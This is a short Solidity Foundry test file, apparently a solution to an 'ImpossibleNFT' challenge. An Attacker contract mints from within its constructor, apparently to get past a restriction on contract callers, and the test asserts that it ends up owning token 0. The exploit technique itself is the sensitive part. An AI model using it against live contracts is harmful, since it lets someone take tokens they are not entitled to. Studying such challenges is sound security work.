pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/ImpossibleNFT/ImpossibleNFT.sol";

contract ImpossibleNFTTest is Test {
    ImpossibleNFT public nft;

    address public attacker = address(0x999999999999999999);

    function setUp() public {
        nft = new ImpossibleNFT();

    }    

    function testImpossibleNFT() public {

        vm.startPrank(attacker);
        Attacker a = new Attacker(address(nft));
        vm.stopPrank();
        // ..
        assert(address(a) == nft.ownerOf(0));
    }
}

contract Attacker {
    ImpossibleNFT public n;
    constructor(address _nft) payable {
        n = ImpossibleNFT(_nft);
        n.mint();
    }

    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes calldata _data) external returns(bytes4) {
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
}